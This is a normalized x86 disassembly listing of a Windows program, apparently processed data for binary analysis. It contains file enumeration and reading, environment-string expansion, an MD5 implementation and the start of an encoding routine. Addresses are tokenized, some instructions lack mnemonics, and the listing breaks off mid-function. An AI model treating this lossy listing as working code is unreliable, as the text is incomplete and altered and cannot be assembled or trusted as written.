lea edx [ esp + 0x2c ]
push ecx
push rw-data
push edx
call sprintf
add esp 0xc
lea eax [ esp + 0x2c ]
push rw-data
push eax
call sprintf
add esp 0x8
jmp r-xdata
lea edi [ esp + 0x2c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x15c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x30 ]
push rw-data
push ecx
call sprintf
lea edi [ esp + 0x38 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x130 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push ebx
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
sub_4039b0
sub esp 0x248
push ebx
push ebp
push esi
mov esi [ esp + 0x258 ]
push edi
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x248
retn
push esi
lea eax [ esp + 0x54 ]
push rw-data
push eax
call sprintf
push rw-data
push esi
call fopen
add esp 0x14
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
lea ecx [ esp + 0x2c ]
push ecx
push esi
call _stat
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
push rw-data
call _strdup
add esp 0x4
mov ebx eax
jmp r-xdata
mov ebp [ esp + 0x40 ]
lea edx [ esp + 0x18 ]
push 0xa
push edx
push 0x0
call _itoa
lea edi [ esp + 0x24 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x5c ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
mov eax ebp
dec ecx
add eax edx
lea esi [ ecx + eax + 0xa ]
push esi
call malloc
mov ebx eax
add esp 0x10
test ebx ebx
jne r-xdata
push 0x1
call exit
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
pop edi
dec ecx
pop esi
mov eax ebx
pop ebp
mov [ rw-data ] ecx
pop ebx
add esp 0x248
retn
mov ecx esi
xor eax eax
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x50 ]
push eax
push ecx
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
push rw-data
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x5c ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ edx + ecx + 0x9 ]
push eax
push ebx
call _snprintf
mov ecx [ esp + 0x24 ]
lea edi [ esp + 0x2c ]
push ecx
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x6c ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
mov eax ebx
dec ecx
add eax edx
push 0x1
lea ecx [ ecx + eax + 0x9 ]
push ecx
call fread
add esp 0x24
cmp eax ebp
je r-xdata
push 0x1
call exit
mov edx [ esp + 0x10 ]
mov [ esi + ebx - 0x1 ] 0x0
push edx
mov [ rw-data ] esi
call fclose
mov eax [ rw-data ]
push eax
push ebx
call sub_401b70
mov ecx [ rw-data ]
push ecx
push ebx
call sub_404a50
push ebx
mov esi eax
call free
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi esi
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
add edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
add edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ edx + ecx + 0x6 ]
push edi
mov [ esp + 0x2c ] edi
call malloc
mov ebp eax
add esp 0x1c
test ebp ebp
jne r-xdata
push 0x1
call exit
mov ecx edi
xor eax eax
mov edx ecx
mov edi ebp
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
push rw-data
[ edi ]
mov eax [ rw-data ]
mov ecx [ esp + 0x18 ]
push rw-data
push eax
push rw-data
push ecx
push ebp
call _snprintf
add esp 0x1c
test esi esi
je r-xdata
push 0x1
call exit
mov [ esp + 0x10 ] 0x0
push esi
call free
add esp 0x4
mov eax [ esp + 0x10 ]
inc eax
cmp eax 0xa
mov [ esp + 0x10 ] eax
jl r-xdata
push rw-data
push edi
call strstr
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov edx [ rw-data ]
or ecx 0xffffffff
shl edx 0x6
xor eax eax
push 0x2
lea edi [ edx + rw-data ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax [ rw-data ]
mov edx ecx
mov esi edi
mov edi rw-data
push eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push rw-data
and ecx 0x3
push ebp
[ edi ] [ esi ]
push rw-data
call sub_401c90
mov edi eax
mov eax [ rw-data ]
add esp 0x14
cmp eax 0xc8
mov [ esp + 0x14 ] edi
jne r-xdata
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x2
[ edi ]
not ecx
dec ecx
push rw-data
add esi ecx
push esi
call strncmp
add esp 0xc
test eax eax
je r-xdata
push ebp
call free
mov eax [ esp + 0x14 ]
add esp 0x4
cmp eax 0xa
jge r-xdata
mov edi [ esp + 0x14 ]
push 0x2
push rw-data
push esi
call strncmp
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x25c ]
lea ecx [ esp + 0x154 ]
push eax
push rw-data
push ecx
call sprintf
add esp 0xc
mov edx [ esp + 0x40 ]
mov eax [ esp + 0x25c ]
push edx
push eax
lea ecx [ esp + 0x15c ]
push rw-data
push ecx
call sprintf
lea edx [ esp + 0x164 ]
push edx
call _strdup
add esp 0x14
mov ebx eax
test edi edi
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call free
mov edi [ esp + 0x18 ]
add esp 0x4
push edi
call free
add esp 0x4
jmp r-xdata
sub_403d70
sub esp 0x200
push esi
push edi
mov edi [ esp + 0x20c ]
push edi
call [ SetCurrentDirectoryA@IAT ]
test eax eax
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
push edi
lea eax [ esp + 0xc ]
push rw-data
push eax
call sprintf
lea ecx [ esp + 0x14 ]
push ecx
call _strdup
add esp 0x10
jmp r-xdata
mov edx [ rw-data ]
push edx
call _strdup
add esp 0x4
mov esi [ rw-data ]
push edi
call sub_404bb0
add esp 0x4
mov [ rw-data ] eax
test esi esi
je r-xdata
mov esi eax
mov eax [ rw-data ]
push eax
call fflush
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x4
[ edi ]
not ecx
dec ecx
mov eax esi
pop edi
mov [ rw-data ] ecx
pop esi
add esp 0x200
retn
push esi
call free
add esp 0x4
sub_403e10
sub esp 0x318
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x104 ] eax
mov ax [ rw-data ]
push esi
push edi
mov [ esp + 0x110 ] ecx
mov [ esp + 0x118 ] ax
mov ecx 0x3d
xor eax eax
lea edi [ esp + 0x11a ]
mov [ esp + 0x114 ] edx
mov edx [ rw-data ]
[ edi ]
mov ecx [ rw-data ]
mov [ esp + 0xc ] edx
mov dl [ rw-data ]
mov [ esp + 0x8 ] ecx
mov cx [ rw-data ]
mov [ esp + 0x16 ] dl
stosw [ edi ]
mov eax [ rw-data ]
mov [ esp + 0x14 ] cx
mov [ esp + 0x10 ] eax
mov ecx 0x3d
xor eax eax
lea edi [ esp + 0x17 ]
[ edi ]
stosb [ edi ]
call [ GetVersion@IAT ]
mov edi [ DoEnvironmentSubstA@IAT ]
mov esi eax
lea eax [ esp + 0x10c ]
push 0x104
push eax
and esi 0xff
call edi
lea ecx [ esp + 0x8 ]
push 0x104
push ecx
call edi
lea edx [ esp + 0x8 ]
lea eax [ esp + 0x10c ]
cmp esi 0x6
push edx
push eax
jb r-xdata
push rw-data
push rw-data
jmp r-xdata
lea ecx [ esp + 0x21c ]
push ecx
call sprintf
add esp 0x10
lea edx [ esp + 0x210 ]
push edx
call sub_401f70
mov edx eax
or ecx 0xffffffff
mov edi edx
xor eax eax
add esp 0x4
[ edi ]
not ecx
dec ecx
pop edi
mov [ rw-data ] ecx
mov eax edx
pop esi
add esp 0x318
retn
sub_403f30
mov edx [ esp + 0x4 ]
push edi
xor eax eax
mov ecx 0x10
lea edi [ edx + 0x18 ]
mov [ edx ] 0x67452301
mov [ edx + 0x4 ] 0xefcdab89
mov [ edx + 0x8 ] 0x98badcfe
mov [ edx + 0xc ] 0x10325476
mov [ edx + 0x10 ] eax
mov [ edx + 0x14 ] eax
[ edi ]
pop edi
retn
sub_403f70
push ebx
mov ebx [ esp + 0x8 ]
push ebp
mov ebp [ esp + 0x14 ]
mov eax [ ebx + 0x10 ]
push esi
push edi
lea ecx [ eax + ebp * 8 ]
cmp ecx eax
mov [ ebx + 0x10 ] ecx
jae r-xdata
mov esi [ ebx + 0x14 ]
mov ecx ebp
shr ecx 0x1d
shr eax 0x3
add esi ecx
and eax 0x3f
mov [ ebx + 0x14 ] esi
je r-xdata
inc [ ebx + 0x14 ]
cmp ebp 0x40
jb r-xdata
mov ecx 0x40
lea edi [ eax + ebx + 0x18 ]
sub ecx eax
cmp ebp ecx
mov [ esp + 0x14 ] ecx
jae r-xdata
mov esi [ esp + 0x18 ]
mov ecx ebp
mov edx ecx
lea edi [ ebx + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax ebp
shr eax 0x6
mov [ esp + 0x14 ] eax
mov esi [ esp + 0x18 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebx + 0x18 ]
push ecx
push ebx
call sub_4041a0
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
add edx eax
add esp 0xc
mov [ esp + 0x18 ] edx
sub ebp eax
mov esi [ esp + 0x18 ]
mov ecx ebp
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
mov esi [ esp + 0x18 ]
lea eax [ ebx + 0x18 ]
mov ecx 0x10
mov edi eax
push ebx
push eax
[ edi ] [ esi ]
push ebx
call sub_4041a0
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
add esp 0xc
add edx 0x40
sub ebp 0x40
dec eax
mov [ esp + 0x18 ] edx
mov [ esp + 0x14 ] eax
jne r-xdata
sub_404060
push esi
mov esi [ esp + 0xc ]
push edi
mov ecx 0x3f
mov eax [ esi + 0x10 ]
shr eax 0x3
and eax 0x3f
sub ecx eax
lea edi [ eax + esi + 0x18 ]
mov [ edi ] 0x80
inc edi
cmp ecx 0x8
jae r-xdata
add ecx 0xfffffff8
xor eax eax
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
[ edi ]
lea edi [ esi + 0x18 ]
push edi
push esi
call sub_4041a0
add esp 0xc
mov ecx 0xe
xor eax eax
[ edi ]
jmp r-xdata
mov al [ esi + 0x10 ]
push esi
mov [ esi + 0x50 ] al
mov eax [ esi + 0x10 ]
mov ecx eax
mov edx eax
shr eax 0x18
mov [ esi + 0x53 ] al
mov al [ esi + 0x14 ]
shr ecx 0x8
shr edx 0x10
mov [ esi + 0x54 ] al
mov eax [ esi + 0x14 ]
mov [ esi + 0x51 ] cl
mov [ esi + 0x52 ] dl
mov ecx eax
mov edx eax
shr eax 0x18
mov [ esi + 0x57 ] al
lea eax [ esi + 0x18 ]
shr ecx 0x8
shr edx 0x10
push eax
push esi
mov [ esi + 0x55 ] cl
mov [ esi + 0x56 ] dl
call sub_4041a0
mov eax [ esp + 0x18 ]
mov cl [ esi ]
add esp 0xc
mov [ eax ] cl
mov edx [ esi ]
shr edx 0x8
mov [ eax + 0x1 ] dl
mov ecx [ esi ]
shr ecx 0x10
mov [ eax + 0x2 ] cl
mov edx [ esi ]
shr edx 0x18
mov [ eax + 0x3 ] dl
mov cl [ esi + 0x4 ]
mov [ eax + 0x4 ] cl
mov edx [ esi + 0x4 ]
shr edx 0x8
mov [ eax + 0x5 ] dl
mov ecx [ esi + 0x4 ]
shr ecx 0x10
mov [ eax + 0x6 ] cl
mov edx [ esi + 0x4 ]
shr edx 0x18
mov [ eax + 0x7 ] dl
mov cl [ esi + 0x8 ]
mov [ eax + 0x8 ] cl
mov edx [ esi + 0x8 ]
shr edx 0x8
mov [ eax + 0x9 ] dl
mov ecx [ esi + 0x8 ]
shr ecx 0x10
mov [ eax + 0xa ] cl
mov edx [ esi + 0x8 ]
shr edx 0x18
mov [ eax + 0xb ] dl
mov cl [ esi + 0xc ]
mov [ eax + 0xc ] cl
mov edx [ esi + 0xc ]
shr edx 0x8
mov [ eax + 0xd ] dl
mov ecx [ esi + 0xc ]
shr ecx 0x10
mov [ eax + 0xe ] cl
mov edx [ esi + 0xc ]
shr edx 0x18
mov [ eax + 0xf ] dl
mov [ esi ] 0x0
pop edi
pop esi
retn
sub_4041a0
mov eax [ esp + 0x8 ]
sub esp 0x40
add eax 0x2
push ebx
push ebp
push esi
push edi
lea esi [ esp + 0x10 ]
mov edi 0x10
xor ecx ecx
xor edx edx
mov ch [ eax + 0x1 ]
mov dl [ eax - 0x1 ]
mov cl [ eax ]
add eax 0x4
shl ecx 0x8
or ecx edx
xor edx edx
mov dl [ eax - 0x6 ]
add esi 0x4
shl ecx 0x8
or ecx edx
dec edi
mov [ esi - 0x4 ] ecx
jne r-xdata
mov ebx [ esp + 0x54 ]
mov ebp [ esp + 0x14 ]
mov edi [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
mov esi [ ebx + 0x4 ]
mov eax [ ebx ]
mov ecx edi
xor ecx edx
and ecx esi
xor ecx edi
add ecx eax
mov eax [ esp + 0x10 ]
lea ecx [ ecx + eax - 0x28955b88 ]
mov eax ecx
shr eax 0x19
shl ecx 0x7
or eax ecx
mov ecx edx
add eax esi
xor ecx esi
and ecx eax
xor ecx edx
add ecx ebp
mov ebp [ esp + 0x18 ]
lea edi [ edi + ecx - 0x173848aa ]
mov ecx edi
shl edi 0xc
shr ecx 0x14
or ecx edi
mov edi esi
xor edi eax
add ecx eax
and edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x1c ]
lea edi [ edx + edi + 0x242070db ]
mov edx edi
shr edx 0xf
shl edi 0x11
or edx edi
mov edi ecx
add edx ecx
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x20 ]
lea edi [ esi + edi - 0x3e423112 ]
mov esi edi
shl esi 0x16
shr edi 0xa
or esi edi
mov edi ecx
add esi edx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x24 ]
lea edi [ eax + edi - 0xa83f051 ]
mov eax edi
shr eax 0x19
shl edi 0x7
or eax edi
mov edi edx
add eax esi
xor edi esi
and edi eax
xor edi edx
add edi ebp
lea edi [ ecx + edi + 0x4787c62a ]
mov ecx edi
shr ecx 0x14
shl edi 0xc
or ecx edi
mov edi esi
add ecx eax
xor edi eax
and edi ecx
xor edi esi
mov ebp [ esp + 0x28 ]
add edi ebp
mov ebp [ esp + 0x2c ]
lea edi [ edx + edi - 0x57cfb9ed ]
mov edx edi
shl edi 0x11
shr edx 0xf
or edx edi
mov edi ecx
xor edi eax
add edx ecx
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x30 ]
lea edi [ esi + edi - 0x2b96aff ]
mov esi edi
shr edi 0xa
shl esi 0x16
or esi edi
mov edi ecx
xor edi edx
add esi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x34 ]
lea edi [ eax + edi + 0x698098d8 ]
mov eax edi
shr eax 0x19
shl edi 0x7
or eax edi
mov edi edx
xor edi esi
add eax esi
and edi eax
xor edi edx
add edi ebp
mov ebp [ esp + 0x38 ]
lea edi [ ecx + edi - 0x74bb0851 ]
mov ecx edi
shr ecx 0x14
shl edi 0xc
or ecx edi
mov edi esi
add ecx eax
xor edi eax
and edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x3c ]
lea edi [ edx + edi - 0xa44f ]
mov edx edi
shr edx 0xf
shl edi 0x11
or edx edi
mov edi ecx
add edx ecx
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x40 ]
lea edi [ esi + edi - 0x76a32842 ]
mov esi edi
shl esi 0x16
shr edi 0xa
or esi edi
mov edi ecx
add esi edx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
lea edi [ eax + edi + 0x6b901122 ]
mov eax edi
shr eax 0x19
shl edi 0x7
or eax edi
mov edi edx
add eax esi
mov ebp [ esp + 0x44 ]
xor edi esi
and edi eax
xor edi edx
add edi ebp
mov ebp [ esp + 0x48 ]
lea ecx [ ecx + edi - 0x2678e6d ]
mov edi ecx
shr edi 0x14
shl ecx 0xc
or edi ecx
mov ecx esi
add edi eax
xor ecx eax
and ecx edi
xor ecx esi
add ecx ebp
mov ebp [ esp + 0x4c ]
lea edx [ edx + ecx - 0x5986bc72 ]
mov ecx edx
shr ecx 0xf
shl edx 0x11
or ecx edx
mov edx edi
add ecx edi
xor edx eax
and edx ecx
xor edx eax
add edx ebp
mov ebp [ esp + 0x14 ]
lea esi [ esi + edx + 0x49b40821 ]
mov edx esi
shl edx 0x16
shr esi 0xa
or edx esi
mov esi ecx
add edx ecx
xor esi edx
and esi edi
xor esi ecx
add esi ebp
mov ebp [ esp + 0x28 ]
lea esi [ eax + esi - 0x9e1da9e ]
mov eax esi
shr eax 0x1b
shl esi 0x5
or eax esi
mov esi edx
add eax edx
xor esi eax
and esi ecx
xor esi edx
add esi ebp
mov ebp [ esp + 0x3c ]
lea edi [ edi + esi - 0x3fbf4cc0 ]
mov esi edi
shr esi 0x17
shl edi 0x9
or esi edi
add esi eax
mov edi esi
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x10 ]
lea edi [ ecx + edi + 0x265e5a51 ]
mov ecx edi
shr ecx 0x12
shl edi 0xe
or ecx edi
mov edi esi
add ecx esi
xor edi ecx
and edi eax
xor edi esi
add edi ebp
lea edi [ edx + edi - 0x16493856 ]
mov edx edi
shl edx 0x14
shr edi 0xc
or edx edi
mov ebp [ esp + 0x24 ]
add edx ecx
mov edi ecx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x38 ]
lea edi [ eax + edi - 0x29d0efa3 ]
mov eax edi
shl edi 0x5
shr eax 0x1b
or eax edi
mov edi edx
add eax edx
xor edi eax
and edi ecx
xor edi edx
add edi ebp
mov ebp [ esp + 0x4c ]
lea edi [ esi + edi + 0x2441453 ]
mov esi edi
shl edi 0x9
shr esi 0x17
or esi edi
add esi eax
mov edi esi
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x20 ]
lea edi [ ecx + edi - 0x275e197f ]
mov ecx edi
shr ecx 0x12
shl edi 0xe
or ecx edi
mov edi esi
add ecx esi
xor edi ecx
and edi eax
xor edi esi
add edi ebp
mov ebp [ esp + 0x34 ]
lea edi [ edx + edi - 0x182c0438 ]
mov edx edi
shl edx 0x14
shr edi 0xc
or edx edi
mov edi ecx
add edx ecx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x48 ]
lea edi [ eax + edi + 0x21e1cde6 ]
mov eax edi
shr eax 0x1b
shl edi 0x5
or eax edi
mov edi edx
add eax edx
xor edi eax
and edi ecx
xor edi edx
add edi ebp
mov ebp [ esp + 0x1c ]
lea edi [ esi + edi - 0x3cc8f82a ]
mov esi edi
shr esi 0x17
shl edi 0x9
or esi edi
add esi eax
mov edi esi
xor edi eax
and edi edx
xor edi eax
add edi ebp
lea edi [ ecx + edi - 0xb2af279 ]
mov ecx edi
mov ebp [ esp + 0x30 ]
shl edi 0xe
shr ecx 0x12
or ecx edi
mov edi esi
add ecx esi
xor edi ecx
and edi eax
xor edi esi
add edi ebp
mov ebp [ esp + 0x44 ]
lea edi [ edx + edi + 0x455a14ed ]
mov edx edi
shl edx 0x14
shr edi 0xc
or edx edi
mov edi ecx
add edx ecx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x18 ]
lea edi [ eax + edi - 0x561c16fb ]
mov eax edi
shr eax 0x1b
shl edi 0x5
or eax edi
mov edi edx
add eax edx
xor edi eax
and edi ecx
xor edi edx
add edi ebp
mov ebp [ esp + 0x2c ]
lea edi [ esi + edi - 0x3105c08 ]
mov esi edi
shr esi 0x17
shl edi 0x9
or esi edi
add esi eax
mov edi esi
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x40 ]
lea ecx [ ecx + edi + 0x676f02d9 ]
mov edi ecx
shr edi 0x12
shl ecx 0xe
or edi ecx
mov ecx esi
add edi esi
xor ecx edi
mov [ esp + 0x58 ] ecx
and ecx eax
xor ecx esi
add ecx ebp
mov ebp [ esp + 0x24 ]
lea edx [ edx + ecx - 0x72d5b376 ]
mov ecx edx
shl ecx 0x14
shr edx 0xc
or ecx edx
mov edx [ esp + 0x58 ]
add ecx edi
xor edx ecx
add edx ebp
mov ebp [ esp + 0x30 ]
lea edx [ eax + edx - 0x5c6be ]
mov eax edx
shr eax 0x1c
shl edx 0x4
or eax edx
mov edx edi
add eax ecx
xor edx ecx
xor edx eax
add edx ebp
lea esi [ esi + edx - 0x788e097f ]
mov ebp [ esp + 0x3c ]
mov edx esi
shr edx 0x15
shl esi 0xb
or edx esi
add edx eax
mov esi edx
xor esi ecx
xor esi eax
add esi ebp
mov ebp [ esp + 0x48 ]
lea edi [ edi + esi + 0x6d9d6122 ]
mov esi edi
shl edi 0x10
shr esi 0x10
or esi edi
mov edi edx
add esi edx
xor edi esi
mov [ esp + 0x58 ] edi
xor edi eax
add edi ebp
mov ebp [ esp + 0x14 ]
lea edi [ ecx + edi - 0x21ac7f4 ]
mov ecx edi
shl ecx 0x17
shr edi 0x9
or ecx edi
mov edi [ esp + 0x58 ]
add ecx esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x20 ]
lea edi [ eax + edi - 0x5b4115bc ]
mov eax edi
shr eax 0x1c
shl edi 0x4
or eax edi
mov edi esi
add eax ecx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x2c ]
lea edi [ edx + edi + 0x4bdecfa9 ]
mov edx edi
shr edx 0x15
shl edi 0xb
or edx edi
add edx eax
mov edi edx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x38 ]
lea edi [ esi + edi - 0x944b4a0 ]
mov esi edi
shr esi 0x10
shl edi 0x10
or esi edi
mov edi edx
add esi edx
xor edi esi
mov [ esp + 0x58 ] edi
xor edi eax
add edi ebp
mov ebp [ esp + 0x44 ]
lea edi [ ecx + edi - 0x41404390 ]
mov ecx edi
shl ecx 0x17
shr edi 0x9
or ecx edi
mov edi [ esp + 0x58 ]
add ecx esi
xor edi ecx
add edi ebp
lea edi [ eax + edi + 0x289b7ec6 ]
mov eax edi
shr eax 0x1c
shl edi 0x4
mov ebp [ esp + 0x10 ]
or eax edi
mov edi esi
add eax ecx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x1c ]
lea edi [ edx + edi - 0x155ed806 ]
mov edx edi
shl edi 0xb
shr edx 0x15
or edx edi
add edx eax
mov edi edx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x28 ]
lea edi [ esi + edi - 0x2b10cf7b ]
mov esi edi
shl edi 0x10
shr esi 0x10
or esi edi
mov edi edx
add esi edx
xor edi esi
mov [ esp + 0x58 ] edi
xor edi eax
add edi ebp
mov ebp [ esp + 0x34 ]
lea edi [ ecx + edi + 0x4881d05 ]
mov ecx edi
shl ecx 0x17
shr edi 0x9
or ecx edi
mov edi [ esp + 0x58 ]
add ecx esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x40 ]
lea edi [ eax + edi - 0x262b2fc7 ]
mov eax edi
shr eax 0x1c
shl edi 0x4
or eax edi
mov edi esi
add eax ecx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x4c ]
lea edi [ edx + edi - 0x1924661b ]
mov edx edi
shr edx 0x15
shl edi 0xb
or edx edi
add edx eax
mov edi edx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x18 ]
lea edi [ esi + edi + 0x1fa27cf8 ]
mov esi edi
shr esi 0x10
shl edi 0x10
or esi edi
mov edi edx
add esi edx
xor edi esi
xor edi eax
add edi ebp
lea edi [ ecx + edi - 0x3b53a99b ]
mov ecx edi
shl ecx 0x17
shr edi 0x9
or ecx edi
mov edi edx
add ecx esi
not edi
mov ebp [ esp + 0x10 ]
or edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x2c ]
lea edi [ eax + edi - 0xbd6ddbc ]
mov eax edi
shl edi 0x6
shr eax 0x1a
or eax edi
mov edi esi
not edi
add eax ecx
or edi eax
xor edi ecx
add edi ebp
mov ebp [ esp + 0x48 ]
lea edi [ edx + edi + 0x432aff97 ]
mov edx edi
shl edi 0xa
shr edx 0x16
or edx edi
mov edi ecx
not edi
add edx eax
or edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x24 ]
lea edi [ esi + edi - 0x546bdc59 ]
mov esi edi
shr esi 0x11
shl edi 0xf
or esi edi
mov edi eax
add esi edx
not edi
or edi esi
xor edi edx
add edi ebp
mov ebp [ esp + 0x40 ]
lea edi [ ecx + edi - 0x36c5fc7 ]
mov ecx edi
shl ecx 0x15
shr edi 0xb
or ecx edi
mov edi edx
add ecx esi
not edi
or edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x1c ]
lea edi [ eax + edi + 0x655b59c3 ]
mov eax edi
shr eax 0x1a
shl edi 0x6
or eax edi
mov edi esi
add eax ecx
not edi
or edi eax
xor edi ecx
add edi ebp
mov ebp [ esp + 0x38 ]
lea edi [ edx + edi - 0x70f3336e ]
mov edx edi
shr edx 0x16
shl edi 0xa
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi ebp
lea edi [ esi + edi - 0x100b83 ]
mov esi edi
shr esi 0x11
shl edi 0xf
or esi edi
mov ebp [ esp + 0x14 ]
mov edi eax
not edi
add esi edx
or edi esi
xor edi edx
add edi ebp
mov ebp [ esp + 0x30 ]
lea edi [ ecx + edi - 0x7a7ba22f ]
mov ecx edi
shr edi 0xb
shl ecx 0x15
or ecx edi
mov edi edx
not edi
add ecx esi
or edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x4c ]
lea edi [ eax + edi + 0x6fa87e4f ]
mov eax edi
shl edi 0x6
shr eax 0x1a
or eax edi
mov edi esi
not edi
add eax ecx
or edi eax
xor edi ecx
add edi ebp
mov ebp [ esp + 0x28 ]
lea edi [ edx + edi - 0x1d31920 ]
mov edx edi
shr edx 0x16
shl edi 0xa
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x44 ]
lea edi [ esi + edi - 0x5cfebcec ]
mov esi edi
shr esi 0x11
shl edi 0xf
or esi edi
mov edi eax
add esi edx
not edi
or edi esi
xor edi edx
add edi ebp
mov ebp [ esp + 0x20 ]
lea edi [ ecx + edi + 0x4e0811a1 ]
mov ecx edi
shl ecx 0x15
shr edi 0xb
or ecx edi
mov edi edx
add ecx esi
not edi
or edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x3c ]
lea edi [ eax + edi - 0x8ac817e ]
mov eax edi
shr eax 0x1a
shl edi 0x6
or eax edi
mov edi esi
add eax ecx
not edi
or edi eax
xor edi ecx
add edi ebp
lea edi [ edx + edi - 0x42c50dcb ]
mov edx edi
shr edx 0x16
shl edi 0xa
mov ebp [ esp + 0x18 ]
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x34 ]
lea esi [ esi + edi + 0x2ad7d2bb ]
mov edi esi
shr edi 0x11
shl esi 0xf
or edi esi
mov esi eax
add edi edx
not esi
or esi edi
xor esi edx
add esi ebp
lea ecx [ ecx + esi - 0x14792c6f ]
mov esi [ ebx ]
add esi eax
mov eax ecx
shl eax 0x15
shr ecx 0xb
mov [ ebx ] esi
mov esi [ ebx + 0x4 ]
or eax ecx
add eax esi
add eax edi
mov [ ebx + 0x4 ] eax
mov eax [ ebx + 0x8 ]
add edi eax
mov eax [ ebx + 0xc ]
mov [ ebx + 0x8 ] edi
add edx eax
pop edi
pop esi
mov [ ebx + 0xc ] edx
pop ebp
pop ebx
add esp 0x40
retn
sub_404a50
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax 0x55555556
lea ecx [ edi * 4 ]
imul ecx
mov eax edx
shr eax 0x1f
lea ecx [ edx + eax + 0x4 ]
push ecx
call malloc
mov edx [ esp + 0x10 ]
